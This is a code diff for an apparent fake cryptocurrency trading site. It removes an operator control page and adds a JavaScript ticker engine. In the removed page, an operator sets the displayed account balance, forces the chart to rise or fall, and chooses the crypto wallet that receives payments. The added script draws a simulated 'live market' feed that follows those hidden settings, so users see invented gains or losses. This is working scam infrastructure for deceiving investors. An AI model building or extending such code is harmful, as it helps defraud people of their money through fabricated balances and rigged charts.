@@ -1,89 +1,142 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Operator Command System</title>
-    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-</head>
-<body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center font-sans antialiased p-4">
+document.addEventListener('DOMContentLoaded', () => {
+    console.log("Binance-style ticker engine online.");
 
-    <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl w-full max-w-md space-y-5">
-        <div>
-            <h2 class="text-xl font-bold tracking-tight text-white uppercase text-emerald-400">Operator Control Interface</h2>
-            <p class="text-xs text-slate-400 mt-1">Real-time macro engine overrides for simulation workflows.</p>
-        </div>
-
-        <hr class="border-slate-800">
-
-        <div class="space-y-4">
-            <div>
-                <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Target Account Balance ($)</label>
-                <input type="number" id="controlBalanceInput" value="600" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-white focus:outline-none focus:border-emerald-500 font-mono">
-            </div>
-
-            <div>
-                <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Chart Performance Trend</label>
-                <select id="controlChartTrend" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-slate-300 focus:outline-none focus:border-emerald-500 font-medium">
-                    <option value="upward">Aggressive Growth (Rise)</option>
-                    <option value="downward">Market Correction (Fall)</option>
-                    <option value="stable">Consolidation (Stable Range)</option>
-                </select>
-            </div>
-
-            <div>
-                <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Display Payment Method</label>
-                <select id="controlCoinSelect" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-slate-300 focus:outline-none focus:border-emerald-500 font-medium">
-                    <option value="USDT (TRC20)">USDT (TRC20 Network)</option>
-                    <option value="Bitcoin (BTC Mainnet)">Bitcoin (BTC Mainnet)</option>
-                    <option value="Ethereum (ETH ERC20)">Ethereum (ETH ERC20)</option>
-                </select>
-            </div>
-
-            <div>
-                <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Receiving Destination Address</label>
-                <input type="text" id="controlAddressInput" placeholder="Enter target crypto wallet address" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-white focus:outline-none focus:border-emerald-500 font-mono text-xs">
-            </div>
-        </div>
-
-        <button onclick="saveControlDirectives()" class="w-full py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-xl transition-all duration-200 shadow-lg shadow-emerald-500/10 cursor-pointer text-sm tracking-wide mt-2">
-            Apply Changes
-        </button>
-    </div>
-
-    <script>
-    function saveControlDirectives() {
-        const balanceVal = document.getElementById('controlBalanceInput').value;
-        const trendVal = document.getElementById('controlChartTrend').value;
-        const selectedCoin = document.getElementById('controlCoinSelect').value;
-        const addressVal = document.getElementById('controlAddressInput').value;
-
-        if (balanceVal !== '') {
-            localStorage.setItem('admin_balance', balanceVal);
-        }
-        
-        // Save the chosen trend state
-        if (trendVal) {
-            localStorage.setItem('chart_trend_directive', trendVal);
-        }
-        
-        if (selectedCoin) {
-            localStorage.setItem('forced_network', selectedCoin);
-        }
-
-        if (addressVal.trim() !== '') {
-            if (selectedCoin === 'USDT (TRC20)') {
-                localStorage.setItem('admin_address', addressVal);
-            } else if (selectedCoin === 'Bitcoin (BTC Mainnet)') {
-                localStorage.setItem('btc_address', addressVal);
-            } else if (selectedCoin === 'Ethereum (ETH ERC20)') {
-                localStorage.setItem('eth_address', addressVal);
-            }
-        }
-
-        alert('Directives successfully dispatched to local storage engine.');
+    // 1. Set the initial control baseline
+    let baselineBalance = 600.00;
+    try {
+        const stored = localStorage.getItem('admin_balance');
+        if (stored) baselineBalance = parseFloat(stored);
+    } catch (e) {
+        console.error(e);
     }
-    </script>
 
-</body>
-</html>
+    // Live display variables
+    let currentLivePrice = baselineBalance;
+    let lastTickPrice = currentLivePrice;
+
+    // Maintain a rolling history of the last 10 ticks for the chart path
+    let chartDataPoints = Array(10).fill(baselineBalance).map((val, idx) => val + (idx - 5) * (Math.random() * 2));
+
+    // UI Element Updater
+    function refreshUIElements(isUpTick) {
+        const balanceTxt = document.getElementById('balance-display');
+        if (balanceTxt) {
+            balanceTxt.innerText = '$' + currentLivePrice.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            
+            // Flash the balance text color briefly to simulate an active market feed
+            balanceTxt.style.color = isUpTick ? '#10b981' : '#ef4444'; 
+        }
+    }
+    refreshUIElements(true);
+
+    // 2. Dynamic Chart Rendering Module
+    let cryptoChartInstance = null;
+    const chartCanvas = document.getElementById('LivePerformanceChart');
+
+    function drawCryptoChart(isUpTick) {
+        if (!chartCanvas || typeof Chart === 'undefined') return;
+
+        if (cryptoChartInstance) {
+            cryptoChartInstance.destroy();
+        }
+
+        const ctxRef = chartCanvas.getContext('2d');
+        const glowArea = ctxRef.createLinearGradient(0, 0, 0, chartCanvas.clientHeight || 220);
+        
+        // Define trade signals: standard green for upward ticks, standard red for downward ticks
+        let strokeColor = '#10b981'; // Bullish Green
+        if (!isUpTick) {
+            strokeColor = '#ef4444'; // Bearish Red
+            glowArea.addColorStop(0, 'rgba(239, 68, 68, 0.20)');
+            glowArea.addColorStop(1, 'rgba(239, 68, 68, 0.00)');
+        } else {
+            glowArea.addColorStop(0, 'rgba(16, 185, 129, 0.20)');
+            glowArea.addColorStop(1, 'rgba(16, 185, 129, 0.00)');
+        }
+
+        // Generate clean placeholders along the bottom timeline axis
+        const timelineLabels = chartDataPoints.map((_, i) => `T-${10 - i}`);
+
+        cryptoChartInstance = new Chart(ctxRef, {
+            type: 'line',
+            data: {
+                labels: timelineLabels,
+                datasets: [{
+                    data: [...chartDataPoints],
+                    borderColor: strokeColor,
+                    borderWidth: 2.5,
+                    pointRadius: 0, // Smooth line without bulky circle points
+                    tension: 0.3,   // Natural market wave curve styling
+                    fill: true,
+                    backgroundColor: glowArea
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                animation: { duration: 200 }, // Snappy transitions for rapid tick updates
+                plugins: { legend: { display: false } },
+                scales: {
+                    x: { display: false }, // Hides clutter on small grid scales
+                    y: {
+                        grid: { color: 'rgba(51, 65, 85, 0.10)', drawBorder: false },
+                        ticks: { 
+                            color: '#64748b', 
+                            font: { size: 10 },
+                            callback: function(v) { return '$' + v.toFixed(2); }
+                        }
+                    }
+                }
+            }
+        });
+    }
+
+    // Initial setup render
+    drawCryptoChart(true);
+
+    // 3. Automated Order Book Simulation Loop (Runs fast every 2 seconds)
+    setInterval(() => {
+        const trendControl = localStorage.getItem('chart_trend_directive') || 'stable';
+        
+        lastTickPrice = currentLivePrice;
+
+        // Generate a random market fluctuation fraction
+        let marketShift = (Math.random() - 0.5) * 1.50;
+
+        // Adjust trend direction based on your choice in control.html
+        if (trendControl === 'upward') {
+            marketShift += 0.40; // Lean heavily toward gains
+        } else if (trendControl === 'downward') {
+            marketShift -= 0.45; // Lean heavily toward drops
+        }
+
+        currentLivePrice += marketShift;
+        if (currentLivePrice < 0) currentLivePrice = 0;
+
+        // Check if the asset price went up or down compared to the last tick
+        const priceWentUp = currentLivePrice >= lastTickPrice;
+
+        // Append the new tick to our rolling dataset and drop the oldest data point
+        chartDataPoints.push(currentLivePrice);
+        chartDataPoints.shift();
+
+        // Push updates live to your screen layout elements
+        refreshUIElements(priceWentUp);
+        drawCryptoChart(priceWentUp);
+    }, 2000);
+
+    // 4. Remote Event Listener for Setting Updates via the Controller
+    window.addEventListener('storage', (event) => {
+        if (!event.newValue) return;
+
+        if (event.key === 'admin_balance') {
+            baselineBalance = parseFloat(event.newValue) || 600.00;
+            currentLivePrice = baselineBalance;
+            lastTickPrice = currentLivePrice;
+            chartDataPoints = Array(10).fill(baselineBalance);
+            
+            refreshUIElements(true);
+            drawCryptoChart(true);
+        }
+    });
+});
